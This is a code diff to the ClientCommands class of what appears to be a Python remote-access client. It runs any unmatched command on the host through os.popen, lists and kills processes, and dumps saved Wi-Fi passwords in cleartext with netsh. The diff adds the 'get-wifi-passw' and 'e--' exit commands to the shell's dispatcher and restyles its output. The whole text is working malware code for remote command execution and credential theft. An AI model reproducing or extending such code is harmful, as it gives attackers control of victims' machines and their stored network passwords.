@@ -6,7 +6,6 @@ import pyautogui
 from getpass import getuser
 import os
 import subprocess
-import re
 import psutil
 from util import Console
 
@@ -63,15 +62,16 @@ class ClientCommands:
                     return os.popen(f"taskkill /im {splitter_kill[0]} /f").read()
             else:
                 if c == "help":
-                    HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN} \t[{Console.GREEN}GET-ALL-APP-NAME{Console.CYAN}]
-              ╰──/{Console.DEFAULT}kill{Console.CYAN}\t   [{Console.GREEN}CLOSE-APP{Console.CYAN}]
-              ╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN} [{Console.GREEN}GET-SAVED-WIFI-PASSWORDS{Console.CYAN}]
-                    """
+                    HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN:<11} [{Console.GREEN}GET-ALL-APP-NAME{Console.CYAN}]\n\t╰──/{Console.DEFAULT}kill{Console.CYAN:<15} [{Console.GREEN}CLOSE-APP{Console.CYAN}]\n\t╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN} [{Console.GREEN}GET-SAVED-WIFI-PASSWORDS{Console.CYAN}]\n\t╰──/{Console.DEFAULT}e--{Console.CYAN:<16} [{Console.GREEN}EXIT-SHELL{Console.CYAN}]""".expandtabs(14)
                     return HELPER
-                if c == "get-apps":
-                    return "".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{p.name()}\n".expandtabs(7) for p in psutil.process_iter())
+                elif c == "get-apps":
+                    return "\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{p.name()}".expandtabs(7) for p in psutil.process_iter())
+                elif c == "get-wifi-passw":
+                    return self.wifiChecked()
+                elif c == "e--":
+                    os.system("exit")
                 else:
-                    return f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{os.popen(c).read()}\n".expandtabs(7)
+                    return f"\t\t{Console.CYAN}╰──/{Console.YELLOW}{os.popen(c).read()}".expandtabs(7)
         except IndexError:
             return " "
 
@@ -83,7 +83,7 @@ class ClientCommands:
             try:
                 results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                 results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                strings += "{:<25}-> {:<}\n".format(i, results[0])
+                strings += f"\t{Console.CYAN}╰──/{Console.DEFAULT}{i:<25} {Console.CYAN}⥤  {results[0]:<}\n".expandtabs(14)
             except subprocess.CalledProcessError:
-                strings += "{:<30}-> {:<}\n".format(i, "ENCODING ERROR")
+                strings += f"\t{Console.CYAN}╰──/{Console.DEFAULT}{i:<25} {Console.CYAN}⥤  {'ENCODING ERROR':<}\n".expandtabs(14)
         return strings
